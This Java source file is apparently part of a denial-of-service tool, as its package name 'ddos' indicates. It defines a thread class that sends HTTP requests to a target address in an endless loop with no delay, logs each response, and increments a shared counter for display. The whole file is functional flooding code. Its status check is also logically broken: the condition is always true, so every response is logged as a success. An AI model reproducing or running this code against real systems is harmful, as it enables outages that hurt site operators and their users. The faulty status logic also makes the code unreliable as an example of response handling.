package com.proj.ddos;

import java.io.IOException;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import javafx.beans.property.SimpleIntegerProperty;

public class RequestThread extends Thread {
    private URI address;
    private long number;
    static SimpleIntegerProperty requestCounter = new SimpleIntegerProperty(0);

    public static final Logger LOGGER = LogManager.getRootLogger();
    private HttpClient client;

    public RequestThread(URI address, HttpClient client) {
        this.address = address;
        this.client = client;
        this.number = this.getId();
    }

    @Override
    public void run() {
        var requestBuilder = HttpRequest.newBuilder().uri(address);
        while (true) {
            HttpRequest request = requestBuilder.build();
            {
                try {

                    HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());
                    LOGGER.info(String.format("Thread %d sent request", this.number));
                    if (response.statusCode() >= 200 || response.statusCode() < 300) {
                        LOGGER.info(String.format("Thread %d recieved status %d ", this.number, response.statusCode()));
                        // LOGGER.log(Level.toLevel(CustomLevels.SUCC_RESP_NAME),
                        // String.format("Thread %d recieved status %d ", this.number,
                        // response.statusCode()));
                    } else {
                        LOGGER.warn(String.format("Thread %d request failed with status code %d", this.number,
                                response.statusCode()));
                        // LOGGER.log(Level.toLevel(CustomLevels.FAIL_RESP_NAME), String.format(
                        // "Thread %d request failed with status code %d", this.number,
                        // response.statusCode()));
                    }
                } catch (IOException ioException) {
                    LOGGER.warn(String.format("Thread %d failed to connect", this.number));
                    // LOGGER.log(Level.toLevel(CustomLevels.CONN_FAILED_NAME),
                    // String.format("Thread %d failed to connect", this.number));
                } catch (InterruptedException interruptedException) {
                    LOGGER.error(String.format("Thread %d was interrupted.", this.number));
                }
            }

            incrementCounter();
        }
    }

    public static synchronized void incrementCounter() {
        requestCounter.set(requestCounter.intValue() + 1);
    }

}
